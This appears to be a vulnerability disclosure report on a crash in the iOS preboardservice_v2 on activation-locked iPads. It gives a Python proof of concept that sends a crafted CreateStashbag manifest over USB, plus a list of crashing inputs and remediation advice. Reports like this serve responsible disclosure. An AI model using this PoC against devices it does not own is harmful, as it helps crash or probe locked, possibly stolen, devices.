# Preboard Service Crash from Crafted Manifests on Activation-Locked Device

## Issue Description

The `com.apple.preboardservice_v2` service, accessible on activation-locked
iOS devices over USB, crashes when receiving crafted manifest data. Three
of four tested manifest formats caused the service to disconnect or pipe
break, while an empty manifest returns `{Skip: True, Version: 2}`.

Specifically:
- Empty dict manifest: Returns normally (`{Skip: True, Version: 2}`)
- Dict with ManifestVersion key: Connection lost (service crash)
- Dict with StashKey + ManifestVersion: Broken pipe (service crash)
- Raw bytes (64 zero bytes): Broken pipe (service crash)

The preboard service handles pre-boot authentication (FDE stashbag
creation/commit). A crash in this service from untrusted input
represents a denial-of-service vulnerability and potentially a memory
corruption issue.

## Affected Component

- Component: preboardservice_v2 (com.apple.preboardservice_v2)
- Platform: iOS/iPadOS 26.3
- Device: iPad8,10 (A12Z Bionic)

## Proof of Concept

```python
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.preboard import PreboardService
import plistlib, asyncio

async def poc():
    l = await create_using_usbmux()
    async with PreboardService(l) as pb:
        # This crashes the service:
        result = await pb.create_stashbag(
            plistlib.dumps({'ManifestVersion': 1})
        )
        # Connection lost / Broken pipe

asyncio.run(poc())
```

## Reproduction Steps

1. Connect activation-locked iOS device via USB
2. Pair with pymobiledevice3
3. Connect to com.apple.preboardservice_v2
4. Send CreateStashbag command with ManifestVersion key in manifest
5. Service crashes (connection lost)

## Impact

- Denial of service: preboard service crash on locked device
- Potential memory corruption: crash from plist parsing suggests
  unhandled input validation
- Accessible on activation-locked device without authentication
- Could be part of an exploit chain if the crash is exploitable

## Environment

- Device: iPad Pro 11-inch 3rd Gen (iPad8,10)
- OS: iPadOS 26.3 (23D127)
- Tools: pymobiledevice3 9.8.2

## Suggested Remediation

1. Validate manifest format before processing.
2. Handle unexpected manifest keys gracefully.
3. Consider restricting preboard service access on activation-locked
   devices if stashbag creation is not needed in that state.
